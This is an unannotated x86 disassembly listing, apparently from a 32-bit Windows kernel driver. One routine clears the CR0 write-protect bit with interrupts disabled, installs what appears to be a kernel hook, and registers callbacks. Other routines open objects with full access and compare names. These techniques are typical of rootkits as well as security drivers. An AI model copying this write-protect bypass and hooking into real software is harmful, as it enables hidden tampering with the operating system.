   181d9:	push   eax
   181da:	call   0x17ac6
   181df:	test   al,al
   181e1:	je     0x181ec
   181e3:	mov    BYTE PTR [ebp-0x81d],0x1
   181ea:	jmp    0x181fa
   181ec:	mov    BYTE PTR [ebp-0x81d],0x1
   181f3:	mov    BYTE PTR [ebp-0x81e],0x1
   181fa:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18201:	jmp    0x18213
   18203:	xor    eax,eax
   18205:	inc    eax
   18206:	ret    
   18207:	mov    esp,DWORD PTR [ebp-0x18]
   1820a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18211:	xor    ebx,ebx
   18213:	push   DWORD PTR [ebp-0x82c]
   18219:	call   0x11956
   1821e:	call   eax
   18220:	cmp    BYTE PTR [ebp-0x81e],bl
   18226:	je     0x1824b
   18228:	push   DWORD PTR [ebp-0x880]
   1822e:	push   DWORD PTR [ebp-0x884]
   18234:	push   DWORD PTR [ebp-0x828]
   1823a:	push   DWORD PTR [ebp-0x824]
   18240:	call   0x17cfa
   18245:	mov    BYTE PTR [ebp-0x81d],al
   1824b:	cmp    DWORD PTR [ebp-0x824],ebx
   18251:	je     0x1825f
   18253:	push   DWORD PTR [ebp-0x824]
   18259:	call   0x10a86
   1825e:	pop    ecx
   1825f:	mov    al,BYTE PTR [ebp-0x81d]
   18265:	call   0x1de48
   1826a:	ret    
   1826b:	int3   
   1826c:	int3   
   1826d:	int3   
   1826e:	int3   
   1826f:	int3   
   18270:	mov    edi,edi
   18272:	push   ebp
   18273:	mov    ebp,esp
   18275:	sub    esp,0xbc
   1827b:	mov    eax,ds:0x7e528
   18280:	xor    eax,ebp
   18282:	mov    DWORD PTR [ebp-0x4],eax
   18285:	push   ebx
   18286:	push   edi
   18287:	push   0x1e938
   1828c:	push   0xb
   1828e:	push   0x1e920
   18293:	call   0x16cb0
   18298:	push   eax
   18299:	lea    eax,[ebp-0xbc]
   1829f:	push   eax
   182a0:	call   0x11c9e
   182a5:	call   eax
   182a7:	xor    eax,eax
   182a9:	lea    edi,[ebp-0xb0]
   182af:	stos   DWORD PTR es:[edi],eax
   182b0:	stos   DWORD PTR es:[edi],eax
   182b1:	stos   DWORD PTR es:[edi],eax
   182b2:	stos   DWORD PTR es:[edi],eax
   182b3:	xor    ebx,ebx
   182b5:	push   ebx
   182b6:	stos   DWORD PTR es:[edi],eax
   182b7:	push   ebx
   182b8:	push   ebx
   182b9:	push   0x1
   182bb:	xor    eax,eax
   182bd:	push   0x7
   182bf:	push   ebx
   182c0:	mov    DWORD PTR [ebp-0x94],ebx
   182c6:	lea    edi,[ebp-0x90]
   182cc:	stos   DWORD PTR es:[edi],eax
   182cd:	lea    eax,[ebp-0xbc]
   182d3:	mov    DWORD PTR [ebp-0xac],eax
   182d9:	push   ebx
   182da:	lea    eax,[ebp-0x94]
   182e0:	push   eax
   182e1:	lea    eax,[ebp-0xb4]
   182e7:	push   eax
   182e8:	push   0x89
   182ed:	lea    eax,[ebp-0x8c]
   182f3:	push   eax
   182f4:	mov    DWORD PTR [ebp-0x8c],ebx
   182fa:	mov    DWORD PTR [ebp-0xb4],0x18
   18304:	mov    DWORD PTR [ebp-0xb0],ebx
   1830a:	mov    DWORD PTR [ebp-0xa8],0x240
   18314:	mov    DWORD PTR [ebp-0xa4],ebx
   1831a:	mov    DWORD PTR [ebp-0xa0],ebx
   18320:	call   0x1185a
   18325:	call   eax
   18327:	test   eax,eax
   18329:	jge    0x18332
   1832b:	xor    al,al
   1832d:	jmp    0x183ee
   18332:	push   esi
   18333:	mov    esi,0x20c
   18338:	push   esi
   18339:	call   0x10a52
   1833e:	pop    ecx
   1833f:	push   0x1
   18341:	mov    edi,eax
   18343:	push   esi
   18344:	push   edi
   18345:	lea    eax,[ebp-0x94]
   1834b:	push   eax
   1834c:	push   DWORD PTR [ebp-0x8c]
   18352:	cmp    edi,ebx
   18354:	setne  BYTE PTR [ebp-0x9c]
   1835b:	call   0x11830
   18360:	call   eax
   18362:	push   DWORD PTR [ebp-0x8c]
   18368:	mov    esi,eax
   1836a:	call   0x11956
   1836f:	call   eax
   18371:	cmp    esi,ebx
   18373:	pop    esi
   18374:	jge    0x18387
   18376:	cmp    BYTE PTR [ebp-0x9c],bl
   1837c:	je     0x1832b
   1837e:	push   edi
   1837f:	call   0x10a86
   18384:	pop    ecx
   18385:	jmp    0x1832b
   18387:	push   0x7
   18389:	push   0x1
   1838b:	lea    eax,[ebp-0x84]
   18391:	push   eax
   18392:	push   DWORD PTR [edi+0x8]
   18395:	call   0x107fe
   1839a:	mov    ecx,0x7e408
   1839f:	lea    eax,[ebp-0x84]
   183a5:	mov    dx,WORD PTR [eax]
   183a8:	cmp    dx,WORD PTR [ecx]
   183ab:	jne    0x183cb
   183ad:	cmp    dx,bx
   183b0:	je     0x183c7
   183b2:	mov    dx,WORD PTR [eax+0x2]
   183b6:	cmp    dx,WORD PTR [ecx+0x2]
   183ba:	jne    0x183cb
   183bc:	add    eax,0x4
   183bf:	add    ecx,0x4
   183c2:	cmp    dx,bx
   183c5:	jne    0x183a5
   183c7:	xor    eax,eax
   183c9:	jmp    0x183d0
   183cb:	sbb    eax,eax
   183cd:	sbb    eax,0xffffffff
   183d0:	cmp    eax,ebx
   183d2:	sete   BYTE PTR [ebp-0x85]
   183d9:	cmp    BYTE PTR [ebp-0x9c],bl
   183df:	je     0x183e8
   183e1:	push   edi
   183e2:	call   0x10a86
   183e7:	pop    ecx
   183e8:	mov    al,BYTE PTR [ebp-0x85]
   183ee:	mov    ecx,DWORD PTR [ebp-0x4]
   183f1:	pop    edi
   183f2:	xor    ecx,ebp
   183f4:	pop    ebx
   183f5:	call   0x1da55
   183fa:	leave  
   183fb:	ret    
   183fc:	int3   
   183fd:	int3   
   183fe:	int3   
   183ff:	int3   
   18400:	int3   
   18401:	int3   
   18402:	push   0x0
   18404:	push   0x19
   18406:	call   0x109dc
   1840b:	test   edx,edx
   1840d:	jl     0x18440
   1840f:	jg     0x18416
   18411:	cmp    eax,0x3
   18414:	jbe    0x18440
   18416:	call   0x1a294
   1841b:	push   0x1e9e0
   18420:	push   0x34
   18422:	push   0x1e976
   18427:	call   0x16cb0
   1842c:	mov    edx,0x7e6c0
   18431:	movzx  ecx,WORD PTR [eax]
   18434:	inc    eax
   18435:	mov    WORD PTR [edx],cx
   18438:	inc    eax
   18439:	inc    edx
   1843a:	inc    edx
   1843b:	test   cx,cx
   1843e:	jne    0x18431
   18440:	ret    
   18441:	int3   
   18442:	int3   
   18443:	int3   
   18444:	int3   
   18445:	int3   
   18446:	mov    edi,edi
   18448:	push   ebp
   18449:	mov    ebp,esp
   1844b:	push   esi
   1844c:	mov    esi,ecx
   1844e:	lea    ecx,[esi+0x4]
   18451:	mov    DWORD PTR [esi],0x7a53c
   18457:	mov    BYTE PTR [ecx+0x8],0x0
   1845b:	call   0x146b4
   18460:	lea    ecx,[esi+0x14]
   18463:	mov    BYTE PTR [ecx+0x8],0x0
   18467:	call   0x14502
   1846c:	mov    eax,DWORD PTR [ebp+0x8]
   1846f:	mov    DWORD PTR [esi+0x24],eax
   18472:	mov    eax,DWORD PTR [ebp+0xc]
   18475:	mov    DWORD PTR [esi+0x28],eax
   18478:	mov    eax,esi
   1847a:	pop    esi
   1847b:	pop    ebp
   1847c:	ret    0x8
   1847f:	int3   
   18480:	int3   
   18481:	int3   
   18482:	int3   
   18483:	int3   
   18484:	mov    edi,edi
   18486:	push   esi
   18487:	mov    esi,ecx
   18489:	lea    ecx,[esi+0x14]
   1848c:	mov    DWORD PTR [esi],0x7a53c
   18492:	call   0x16110
   18497:	lea    ecx,[esi+0x4]
   1849a:	pop    esi
   1849b:	jmp    0x16abe
   184a0:	int3   
   184a1:	int3   
   184a2:	int3   
   184a3:	int3   
   184a4:	int3   
   184a5:	int3   
   184a6:	mov    edi,edi
   184a8:	push   ebp
   184a9:	mov    ebp,esp
   184ab:	sub    esp,0x124
   184b1:	push   ebx
   184b2:	push   esi
   184b3:	push   edi
   184b4:	mov    esi,ecx
   184b6:	call   0x16fc0
   184bb:	push   DWORD PTR [ebp+0x8]
   184be:	lea    eax,[ebp-0x4]
   184c1:	lea    edi,[esi+0x4]
   184c4:	push   eax
   184c5:	mov    ecx,edi
   184c7:	call   0x13d40
   184cc:	mov    ebx,DWORD PTR [ebp-0x4]
   184cf:	cmp    ebx,DWORD PTR [esi+0x8]
   184d2:	je     0x1851d
   184d4:	mov    eax,DWORD PTR [esi+0x18]
   184d7:	lea    ecx,[ebp+0x8]
   184da:	mov    DWORD PTR [ebp+0x8],eax
   184dd:	call   0x13d20
   184e2:	mov    edi,DWORD PTR [eax]
   184e4:	lea    eax,[ebx+0x68]
   184e7:	add    esi,0x14
   184ea:	inc    edi
   184eb:	push   eax
   184ec:	mov    ecx,esi
   184ee:	mov    DWORD PTR [ebp+0x8],edi
   184f1:	mov    DWORD PTR [ebp-0x4],eax
   184f4:	call   0x14dfa
   184f9:	lea    eax,[ebp+0x8]
   184fc:	push   eax
   184fd:	lea    eax,[ebp-0xc]
   18500:	push   eax
   18501:	mov    ecx,esi
   18503:	call   0x160e6
   18508:	push   DWORD PTR [ebp+0xc]
   1850b:	lea    ecx,[ebx+0x18]
   1850e:	call   0x12a8a
   18513:	mov    eax,DWORD PTR [ebp-0x4]
   18516:	mov    DWORD PTR [eax],edi
   18518:	jmp    0x185b2
   1851d:	lea    ecx,[ebp-0x64]
   18520:	call   0x136ea
   18525:	xor    eax,eax
   18527:	cmp    DWORD PTR [esi+0x20],eax
   1852a:	je     0x1853d
   1852c:	mov    eax,DWORD PTR [esi+0x18]
   1852f:	lea    ecx,[ebp-0x4]
   18532:	mov    DWORD PTR [ebp-0x4],eax
   18535:	call   0x13d20
   1853a:	mov    eax,DWORD PTR [eax]
   1853c:	inc    eax
   1853d:	push   DWORD PTR [ebp+0xc]
   18540:	lea    ecx,[ebp-0x64]
   18543:	mov    DWORD PTR [ebp-0x4],eax
   18546:	mov    DWORD PTR [ebp-0x14],eax
   18549:	call   0x12a8a
   1854e:	lea    eax,[ebp-0x64]
   18551:	push   eax
   18552:	push   DWORD PTR [ebp+0x8]
   18555:	lea    ecx,[ebp-0x124]
   1855b:	call   0x135f2
   18560:	lea    eax,[ebp-0x124]
   18566:	push   eax
   18567:	lea    ecx,[ebp-0xc4]
   1856d:	call   0x13a22
   18572:	lea    eax,[ebp-0xc4]
   18578:	push   eax
   18579:	lea    eax,[ebp-0xc]
   1857c:	push   eax
   1857d:	mov    ecx,edi
   1857f:	call   0x16a94
   18584:	lea    ecx,[ebp-0xc4]
   1858a:	call   0x12b10
   1858f:	lea    ecx,[ebp-0x124]
   18595:	call   0x12b10
   1859a:	lea    eax,[ebp-0x4]
   1859d:	push   eax
   1859e:	lea    eax,[ebp-0xc]
   185a1:	push   eax
   185a2:	lea    ecx,[esi+0x14]
   185a5:	call   0x160e6
   185aa:	lea    ecx,[ebp-0x64]
   185ad:	call   0x11ef4
   185b2:	pop    edi
   185b3:	pop    esi
   185b4:	pop    ebx
   185b5:	leave  
   185b6:	ret    0x8
   185b9:	int3   
   185ba:	int3   
   185bb:	int3   
   185bc:	int3   
   185bd:	int3   
   185be:	mov    edi,edi
   185c0:	push   ebp
   185c1:	mov    ebp,esp
   185c3:	sub    esp,0x10
   185c6:	call   0x1a202
   185cb:	test   al,al
   185cd:	jne    0x185d7
   185cf:	mov    eax,DWORD PTR [ebp+0x8]
   185d2:	jmp    0x1866b
   185d7:	push   esi
   185d8:	mov    esi,DWORD PTR [ebp+0x8]
   185db:	push   0xffffffff
   185dd:	push   esi
   185de:	lea    ecx,[ebp-0x8]
   185e1:	call   0x1115c
   185e6:	mov    ecx,DWORD PTR ds:0x7fa58
   185ec:	lea    eax,[ebp-0x8]
   185ef:	push   eax
   185f0:	lea    eax,[ebp+0x8]
   185f3:	push   eax
   185f4:	call   0x14230
   185f9:	mov    eax,DWORD PTR [ebp+0x8]
   185fc:	mov    ecx,DWORD PTR ds:0x7fa58
   18602:	cmp    eax,DWORD PTR [ecx+0x4]
   18605:	jne    0x18636
   18607:	lea    eax,[ebp-0x8]
   1860a:	push   eax
   1860b:	lea    ecx,[ebp-0x10]
   1860e:	call   0x12b4c
   18613:	mov    ecx,DWORD PTR ds:0x7fa58
   18619:	lea    eax,[ebp-0x10]
   1861c:	push   eax
   1861d:	lea    eax,[ebp-0x8]
   18620:	push   eax
   18621:	call   0x17072
   18626:	mov    ecx,eax
   18628:	call   0x12b6e
   1862d:	push   DWORD PTR [ebp-0x10]
   18630:	call   0x10a86
   18635:	pop    ecx
   18636:	mov    ecx,DWORD PTR ds:0x7fa58
   1863c:	lea    eax,[ebp-0x8]
   1863f:	push   eax
   18640:	lea    eax,[ebp+0x8]
   18643:	push   eax
   18644:	call   0x14230
   18649:	mov    eax,DWORD PTR [ebp+0x8]
   1864c:	mov    ecx,DWORD PTR ds:0x7fa58
   18652:	cmp    eax,DWORD PTR [ecx+0x4]
   18655:	je     0x1865a
   18657:	mov    esi,DWORD PTR [eax+0x14]
   1865a:	call   0x1a21e
   1865f:	push   DWORD PTR [ebp-0x8]
   18662:	call   0x10a86
   18667:	pop    ecx
   18668:	mov    eax,esi
   1866a:	pop    esi
   1866b:	leave  
   1866c:	ret    0x4
   1866f:	int3   
   18670:	int3   
   18671:	int3   
   18672:	int3   
   18673:	int3   
   18674:	mov    edi,edi
   18676:	push   ebp
   18677:	mov    ebp,esp
   18679:	push   esi
   1867a:	mov    esi,ecx
   1867c:	call   0x18484
   18681:	test   BYTE PTR [ebp+0x8],0x1
   18685:	je     0x1868e
   18687:	push   esi
   18688:	call   0x10a86
   1868d:	pop    ecx
   1868e:	mov    eax,esi
   18690:	pop    esi
   18691:	pop    ebp
   18692:	ret    0x4
   18695:	int3   
   18696:	int3   
   18697:	int3   
   18698:	int3   
   18699:	int3   
   1869a:	mov    edi,edi
   1869c:	push   ebp
   1869d:	mov    ebp,esp
   1869f:	push   esi
   186a0:	push   DWORD PTR [ebp+0xc]
   186a3:	mov    esi,ecx
   186a5:	push   DWORD PTR [ebp+0x8]
   186a8:	call   0x18446
   186ad:	mov    eax,esi
   186af:	pop    esi
   186b0:	pop    ebp
   186b1:	ret    0x8
   186b4:	int3   
   186b5:	int3   
   186b6:	int3   
   186b7:	int3   
   186b8:	int3   
   186b9:	int3   
   186ba:	push   0x33c
   186bf:	push   0x7e248
   186c4:	call   0x1de00
   186c9:	mov    esi,DWORD PTR [ebp+0xc]
   186cc:	mov    DWORD PTR [ebp-0x32c],esi
   186d2:	call   DWORD PTR ds:0x1f000
   186d8:	xor    ebx,ebx
   186da:	cmp    BYTE PTR [ebp+0x10],bl
   186dd:	jne    0x1871b
   186df:	push   esi
   186e0:	mov    ecx,DWORD PTR ds:0x7e558
   186e6:	call   0x15e8a
   186eb:	mov    edi,eax
   186ed:	push   esi
   186ee:	mov    ecx,DWORD PTR ds:0x7e558
   186f4:	call   0x166c2
   186f9:	mov    eax,edi
   186fb:	dec    eax
   186fc:	je     0x18710
   186fe:	dec    eax
   186ff:	je     0x1870c
   18701:	dec    eax
   18702:	jne    0x188f6
   18708:	push   0xa
   1870a:	jmp    0x18711
   1870c:	push   0x2
   1870e:	jmp    0x18711
   18710:	push   ebx
   18711:	call   0x10fe2
   18716:	jmp    0x188f6
   1871b:	mov    DWORD PTR [ebp-0x320],ebx
   18721:	xor    eax,eax
   18723:	lea    edi,[ebp-0x326]
   18729:	stos   DWORD PTR es:[edi],eax
   1872a:	stos   WORD PTR es:[edi],ax
   1872c:	xor    eax,eax
   1872e:	mov    WORD PTR [ebp-0x21c],ax
   18735:	push   0x1fc
   1873a:	push   ebx
   1873b:	lea    eax,[ebp-0x21a]
   18741:	push   eax
   18742:	call   0x1daba
   18747:	add    esp,0xc
   1874a:	lea    eax,[ebp-0x21c]
   18750:	mov    DWORD PTR [ebp-0x324],eax
   18756:	xor    eax,eax
   18758:	mov    WORD PTR [ebp-0x328],ax
   1875f:	mov    eax,0x1fe
   18764:	mov    WORD PTR [ebp-0x326],ax
   1876b:	mov    DWORD PTR [ebp-0x34c],0x18
   18775:	mov    DWORD PTR [ebp-0x348],ebx
   1877b:	mov    DWORD PTR [ebp-0x340],0x200
   18785:	mov    DWORD PTR [ebp-0x344],ebx
   1878b:	mov    DWORD PTR [ebp-0x33c],ebx
   18791:	mov    DWORD PTR [ebp-0x338],ebx
   18797:	mov    DWORD PTR [ebp-0x334],esi
   1879d:	mov    DWORD PTR [ebp-0x330],ebx
   187a3:	lea    eax,[ebp-0x334]
   187a9:	push   eax
   187aa:	lea    eax,[ebp-0x34c]
   187b0:	push   eax
   187b1:	push   0x1f0fff
   187b6:	lea    eax,[ebp-0x320]
   187bc:	push   eax
   187bd:	call   0x1168c
   187c2:	call   eax
   187c4:	test   eax,eax
   187c6:	jl     0x188f6
   187cc:	lea    eax,[ebp-0x328]
   187d2:	push   eax
   187d3:	push   DWORD PTR [ebp-0x320]
   187d9:	call   0x11fc0
   187de:	cmp    eax,ebx
   187e0:	jl     0x188e9
   187e6:	movzx  eax,WORD PTR [ebp-0x328]
   187ed:	shr    eax,1
   187ef:	xor    ecx,ecx
   187f1:	mov    WORD PTR [ebp+eax*2-0x21c],cx
   187f9:	push   DWORD PTR [ebp-0x320]
   187ff:	call   0x12052
   18804:	lea    eax,[ebp-0x21c]
   1880a:	push   eax
   1880b:	call   0x10dc0
   18810:	cmp    eax,ebx
   18812:	je     0x18837
   18814:	push   eax
   18815:	push   esi
   18816:	mov    ecx,DWORD PTR ds:0x7e558
   1881c:	call   0x16c6e
   18821:	push   DWORD PTR [ebp-0x320]
   18827:	push   DWORD PTR [ebp-0x320]
   1882d:	call   0x12052
   18832:	push   eax
   18833:	push   esi
   18834:	push   ebx
   18835:	jmp    0x188b5
   18837:	push   0x1ea22
   1883c:	push   0x9
   1883e:	push   0x1ea0e
   18843:	call   0x16cb0
   18848:	push   eax
   18849:	lea    eax,[ebp-0x328]
   1884f:	push   eax
   18850:	call   0x10e02
   18855:	test   al,al
   18857:	je     0x188bc
   18859:	cmp    DWORD PTR ds:0x7fa34,ebx
   1885f:	jne    0x18892
   18861:	mov    DWORD PTR ds:0x7fa34,0x1
   1886b:	mov    DWORD PTR [ebp-0x4],ebx
   1886e:	call   0x17fa6
   18873:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1887a:	jmp    0x18892
   1887c:	xor    eax,eax
   1887e:	inc    eax
   1887f:	ret    
   18880:	mov    esp,DWORD PTR [ebp-0x18]
   18883:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1888a:	xor    ebx,ebx
   1888c:	mov    esi,DWORD PTR [ebp-0x32c]
   18892:	cmp    DWORD PTR ds:0x7efac,ebx
   18898:	jne    0x188a0
   1889a:	mov    DWORD PTR ds:0x7efac,esi
   188a0:	push   DWORD PTR [ebp-0x320]
   188a6:	push   DWORD PTR [ebp-0x320]
   188ac:	call   0x12052
   188b1:	push   eax
   188b2:	push   esi
   188b3:	push   0x1
   188b5:	call   0x13802
   188ba:	jmp    0x188e9
   188bc:	lea    eax,[ebp-0x31c]
   188c2:	push   eax
   188c3:	call   0x10f92
   188c8:	test   al,al
   188ca:	je     0x188e9
   188cc:	lea    eax,[ebp-0x31c]
   188d2:	push   eax
   188d3:	lea    eax,[ebp-0x328]
   188d9:	push   eax
   188da:	call   0x10e02
   188df:	test   al,al
   188e1:	je     0x188e9
   188e3:	push   esi
   188e4:	call   0x12082
   188e9:	push   DWORD PTR [ebp-0x320]
   188ef:	call   0x11956
   188f4:	call   eax
   188f6:	call   0x1de48
   188fb:	ret    0xc
   188fe:	int3   
   188ff:	int3   
   18900:	int3   
   18901:	int3   
   18902:	int3   
   18903:	int3   
   18904:	mov    edi,edi
   18906:	push   ebp
   18907:	mov    ebp,esp
   18909:	push   ecx
   1890a:	cli    
   1890b:	mov    eax,cr0
   1890e:	mov    DWORD PTR [ebp-0x4],eax
   18911:	and    eax,0xfffeffff
   18916:	mov    cr0,eax
   18919:	push   0x17786
   1891e:	push   DWORD PTR ds:0x7eef4
   18924:	call   0x198cc
   18929:	push   0x0
   1892b:	push   0x186ba
   18930:	mov    ds:0x7eef8,eax
   18935:	call   0x1170a
   1893a:	call   eax
   1893c:	push   0x17672
   18941:	call   0x116b6
   18946:	call   eax
   18948:	mov    eax,DWORD PTR [ebp-0x4]
   1894b:	mov    cr0,eax
   1894e:	sti    
   1894f:	leave  
   18950:	ret    
   18951:	int3   
   18952:	int3   
   18953:	int3   
   18954:	int3   
   18955:	int3   
   18956:	mov    edi,edi
   18958:	push   ebp
   18959:	mov    ebp,esp
   1895b:	sub    esp,0x50
   1895e:	push   ebx
   1895f:	mov    ebx,DWORD PTR [ebp+0x8]
   18962:	push   esi
   18963:	test   bl,0x20
   18966:	je     0x189a9
   18968:	push   DWORD PTR [ebp+0x30]
   1896b:	mov    esi,DWORD PTR ds:0x7eef0
   18971:	push   DWORD PTR [ebp+0x2c]
   18974:	lea    ecx,[ebp-0x50]
   18977:	push   DWORD PTR [ebp+0x28]
   1897a:	push   DWORD PTR [ebp+0x24]
   1897d:	push   DWORD PTR [ebp+0x20]
   18980:	push   DWORD PTR [ebp+0x1c]
   18983:	push   DWORD PTR [ebp+0x14]
   18986:	push   DWORD PTR [ebp+0x10]
   18989:	push   DWORD PTR [ebp+0xc]
   1898c:	call   0x1374e
   18991:	push   eax
   18992:	push   DWORD PTR [ebp+0xc]
   18995:	mov    ecx,esi
   18997:	call   0x184a6
   1899c:	lea    ecx,[ebp-0x50]
   1899f:	call   0x11ef4
   189a4:	jmp    0x18aee
   189a9:	push   DWORD PTR [ebp+0xc]
   189ac:	mov    ecx,DWORD PTR ds:0x7eee8
   189b2:	call   0x1618c
   189b7:	test   eax,eax
   189b9:	jne    0x189c7
   189bb:	test   bl,0x1
   189be:	jne    0x189c7
   189c0:	xor    al,al
   189c2:	jmp    0x18af0
   189c7:	push   DWORD PTR [ebp+0xc]
   189ca:	mov    ecx,DWORD PTR ds:0x7eee8
   189d0:	call   0x16eb6
   189d5:	mov    esi,eax
   189d7:	test   bl,0x1
   189da:	je     0x18a24
   189dc:	mov    eax,DWORD PTR [ebp+0x28]
   189df:	push   DWORD PTR [ebp+0xc]
   189e2:	mov    ecx,esi
   189e4:	mov    DWORD PTR [esi+0x2c],eax
   189e7:	call   0x129fc
   189ec:	push   DWORD PTR [ebp+0x10]
   189ef:	lea    ecx,[esi+0x8]
   189f2:	call   0x129fc
   189f7:	mov    eax,DWORD PTR [ebp+0x14]
   189fa:	push   DWORD PTR [ebp+0x18]
   189fd:	lea    ecx,[esi+0x14]
   18a00:	mov    DWORD PTR [esi+0x10],eax
   18a03:	call   0x129fc
   18a08:	push   DWORD PTR [ebp+0x1c]
   18a0b:	lea    ecx,[esi+0x1c]
   18a0e:	call   0x129fc
   18a13:	push   DWORD PTR [ebp+0x20]
   18a16:	lea    ecx,[esi+0x24]
   18a19:	call   0x129fc
   18a1e:	mov    eax,DWORD PTR [ebp+0x2c]
   18a21:	mov    DWORD PTR [esi+0x30],eax
   18a24:	mov    DWORD PTR [ebp+0x28],ebx
   18a27:	and    DWORD PTR [ebp+0x28],0x2
   18a2b:	je     0x18a3b
   18a2d:	mov    eax,DWORD PTR [ebp+0x30]
   18a30:	mov    ecx,DWORD PTR [eax]
   18a32:	mov    DWORD PTR [esi+0x38],ecx
   18a35:	mov    eax,DWORD PTR [eax+0x4]
   18a38:	mov    DWORD PTR [esi+0x3c],eax
   18a3b:	mov    DWORD PTR [ebp+0x10],ebx
   18a3e:	and    DWORD PTR [ebp+0x10],0x4
   18a42:	je     0x18a52
   18a44:	mov    eax,DWORD PTR [ebp+0x34]
   18a47:	mov    ecx,DWORD PTR [eax]
   18a49:	mov    DWORD PTR [esi+0x40],ecx
   18a4c:	mov    eax,DWORD PTR [eax+0x4]
   18a4f:	mov    DWORD PTR [esi+0x44],eax
   18a52:	test   bl,0x10
   18a55:	je     0x18aee
   18a5b:	cmp    DWORD PTR [esi+0x18],0x0
   18a5f:	jbe    0x18aee
   18a65:	mov    eax,ds:0x7eee8
   18a6a:	mov    eax,DWORD PTR [eax+0x4]
   18a6d:	push   edi
   18a6e:	mov    edi,DWORD PTR [eax]
   18a70:	mov    DWORD PTR [ebp+0x14],edi
   18a73:	cmp    edi,eax
   18a75:	je     0x18aed
   18a77:	push   DWORD PTR [ebp+0xc]
   18a7a:	lea    ebx,[edi+0x10]
   18a7d:	push   ebx
   18a7e:	call   0x19814
   18a83:	test   al,al
   18a85:	je     0x18ad8
   18a87:	lea    eax,[esi+0x14]
   18a8a:	push   eax
   18a8b:	add    edi,0x2c
   18a8e:	push   edi
   18a8f:	call   0x19804
   18a94:	test   al,al
   18a96:	je     0x18ad8
   18a98:	cmp    DWORD PTR [ebp+0x28],0x0
   18a9c:	je     0x18ab8
   18a9e:	mov    ecx,DWORD PTR ds:0x7eee8
   18aa4:	push   ebx
   18aa5:	call   0x16eb6
   18aaa:	mov    ecx,DWORD PTR [ebp+0x30]
   18aad:	mov    edx,DWORD PTR [ecx]
   18aaf:	mov    DWORD PTR [eax+0x38],edx
   18ab2:	mov    ecx,DWORD PTR [ecx+0x4]
   18ab5:	mov    DWORD PTR [eax+0x3c],ecx
   18ab8:	cmp    DWORD PTR [ebp+0x10],0x0
   18abc:	je     0x18ad8
   18abe:	mov    ecx,DWORD PTR ds:0x7eee8
   18ac4:	push   ebx
   18ac5:	call   0x16eb6
   18aca:	mov    ecx,DWORD PTR [ebp+0x34]
   18acd:	mov    edx,DWORD PTR [ecx]
   18acf:	mov    DWORD PTR [eax+0x40],edx
   18ad2:	mov    ecx,DWORD PTR [ecx+0x4]
   18ad5:	mov    DWORD PTR [eax+0x44],ecx
   18ad8:	lea    ecx,[ebp+0x14]
   18adb:	call   0x13890
   18ae0:	mov    edi,DWORD PTR [ebp+0x14]
   18ae3:	mov    eax,ds:0x7eee8
   18ae8:	cmp    edi,DWORD PTR [eax+0x4]
   18aeb:	jne    0x18a77
   18aed:	pop    edi
   18aee:	mov    al,0x1
   18af0:	pop    esi
   18af1:	pop    ebx
   18af2:	leave  
   18af3:	ret    0x30
   18af6:	int3   
   18af7:	int3   
   18af8:	int3   
   18af9:	int3   
   18afa:	int3   
   18afb:	int3   
   18afc:	push   0x4c
   18afe:	push   0x7e268
   18b03:	call   0x1daf8
   18b08:	xor    esi,esi
   18b0a:	push   esi
   18b0b:	push   esi
   18b0c:	push   esi
   18b0d:	push   esi
   18b0e:	push   0x7e560
   18b13:	call   DWORD PTR ds:0x1f028
   18b19:	cmp    eax,esi
   18b1b:	jge    0x18b2c
   18b1d:	mov    eax,DWORD PTR [ebp+0x8]
   18b20:	mov    DWORD PTR [eax+0x8],0x4
   18b27:	jmp    0x18c61
   18b2c:	mov    DWORD PTR [ebp-0x4],esi
   18b2f:	or     ebx,0xffffffff
   18b32:	push   ebx
   18b33:	mov    esi,DWORD PTR [ebp+0x8]
   18b36:	lea    eax,[esi+0x28]
   18b39:	push   eax
   18b3a:	lea    ecx,[ebp-0x44]
   18b3d:	call   0x129ba
   18b42:	mov    edi,DWORD PTR [ebp-0x40]
   18b45:	inc    edi
   18b46:	push   ebx
   18b47:	lea    eax,[edi+esi*1+0x28]
   18b4b:	push   eax
   18b4c:	lea    ecx,[ebp-0x3c]
   18b4f:	call   0x129ba
   18b54:	mov    eax,DWORD PTR [ebp-0x38]
   18b57:	lea    edi,[edi+eax*1+0x1]
   18b5b:	mov    eax,DWORD PTR [edi+esi*1+0x28]
   18b5f:	mov    DWORD PTR [ebp-0x1c],eax
   18b62:	add    edi,0x4
   18b65:	push   ebx
   18b66:	lea    eax,[edi+esi*1+0x28]
   18b6a:	push   eax
   18b6b:	lea    ecx,[ebp-0x34]
   18b6e:	call   0x129ba
   18b73:	mov    eax,DWORD PTR [ebp-0x30]
   18b76:	lea    edi,[edi+eax*1+0x1]
   18b7a:	push   ebx
   18b7b:	lea    eax,[edi+esi*1+0x28]
   18b7f:	push   eax
   18b80:	lea    ecx,[ebp-0x2c]
   18b83:	call   0x129ba
   18b88:	mov    eax,DWORD PTR [ebp-0x28]
   18b8b:	lea    edi,[edi+eax*1+0x1]
   18b8f:	push   ebx
   18b90:	lea    eax,[edi+esi*1+0x28]
   18b94:	push   eax
   18b95:	lea    ecx,[ebp-0x24]
   18b98:	call   0x129ba
   18b9d:	mov    eax,DWORD PTR [ebp-0x20]
   18ba0:	lea    eax,[edi+eax*1+0x1]
   18ba4:	push   ebx
   18ba5:	lea    eax,[eax+esi*1+0x28]
   18ba9:	push   eax
   18baa:	lea    ecx,[ebp-0x5c]
   18bad:	call   0x129ba
   18bb2:	mov    eax,DWORD PTR [esi+0xc]
   18bb5:	mov    ecx,DWORD PTR [esi+0x18]
   18bb8:	mov    DWORD PTR [ebp-0x54],ecx
   18bbb:	mov    ecx,DWORD PTR [esi+0x1c]
   18bbe:	mov    DWORD PTR [ebp-0x50],ecx
   18bc1:	mov    ecx,DWORD PTR [esi+0x20]
   18bc4:	mov    DWORD PTR [ebp-0x4c],ecx
   18bc7:	mov    ecx,DWORD PTR [esi+0x24]
   18bca:	mov    DWORD PTR [ebp-0x48],ecx
   18bcd:	mov    ecx,DWORD PTR [esi+0x10]
   18bd0:	lea    edx,[ebp-0x4c]
   18bd3:	push   edx
   18bd4:	lea    edx,[ebp-0x54]
   18bd7:	push   edx
   18bd8:	push   ecx
   18bd9:	push   eax
   18bda:	lea    eax,[ebp-0x5c]
   18bdd:	push   eax
   18bde:	lea    eax,[ebp-0x24]
   18be1:	push   eax
   18be2:	lea    eax,[ebp-0x2c]
   18be5:	push   eax
   18be6:	lea    eax,[ebp-0x34]
   18be9:	push   eax
